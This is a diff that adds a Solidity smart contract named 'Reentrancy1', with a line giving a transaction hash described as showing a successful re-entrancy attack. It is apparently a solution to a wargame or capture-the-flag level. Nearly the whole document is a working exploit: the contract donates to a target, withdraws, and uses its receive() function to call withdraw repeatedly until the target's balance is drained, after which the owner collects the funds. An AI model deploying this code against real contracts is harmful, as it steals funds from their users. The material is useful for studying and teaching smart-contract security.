@@ -1,1 +1,47 @@
 Here is the hash showing the successful re-entrancy attack: 0xfafe56ec78f4f27840223d5e587ae6f75e2ac930f6f7c32546500f473a9310a5
+
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.2;
+
+interface OtherContract {
+    function donate(address _to) external payable;
+    function withdraw(uint _amount) external;
+}
+
+contract Reentrancy1 {
+    address public owner;
+    OtherContract public TargetContract;
+    uint256 public increment = 1000000000000000;
+    uint256 public targetValue = 1000000000000000;
+
+    constructor(address targetAddress) {
+        TargetContract = OtherContract(targetAddress);
+        owner = msg.sender;
+    }
+
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+
+    function donateAndWithdraw() public payable {
+        require(msg.value >= targetValue, "Insufficient value");
+        TargetContract.donate{value: msg.value}(address(this));
+        TargetContract.withdraw(msg.value);
+    }
+
+    function withdrawAll() public returns (bool) {
+        require(msg.sender == owner, "Only the owner can withdraw money");
+        uint256 totalBalance = address(this).balance;
+        (bool sent, ) = msg.sender.call{value: totalBalance}("");
+        require(sent, "Failed to send ETH");
+        return sent;
+    }
+
+    receive() external payable {
+        uint256 targetBalance = address(TargetContract).balance;
+        if (targetBalance >= targetValue) {
+            TargetContract.withdraw(targetValue);
+        }
+    }
+}
